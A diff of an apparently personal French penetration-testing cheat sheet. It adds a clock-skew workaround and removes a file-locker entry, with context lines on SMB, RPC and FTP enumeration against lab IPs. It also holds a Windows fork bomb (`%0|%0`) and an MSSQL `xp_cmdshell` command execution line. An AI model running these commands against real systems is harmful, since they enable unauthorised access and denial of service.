@@ -334,8 +334,6 @@ Invoke-RestMethod -Uri $url -OutFile $dest`
 
 - `%0|%0` (mettre le fichier en .bat) --> Ralentis l'ordinateur
 
-- Simple file Locker --> Mettre un un mdp sur des fichiers/dossiers
-
 - Récupérer des fichiers en FTP passif : `wget -m --no-passive ftp://anonymous:anonymous@10.10.110.100`
 
 - Samba (connexion FTP like) --> `smbclient -L \\10.129.118.175`
@@ -370,6 +368,8 @@ SQL (sophie  dbo@master)> EXEC xp_cmdshell 'whoami';
 ```
 
 - GTFoBins pour Windows --> https://lolbas-project.github.io/
+
+- Si problème d'horloge --> `faketime “$(ntpdate -q 10.10.11.42|awk ‘{print $1 " " $2}’)” [Your Command here]`
 
 - RPC --> `rpcclient -U '%' 10.10.10.161`
 
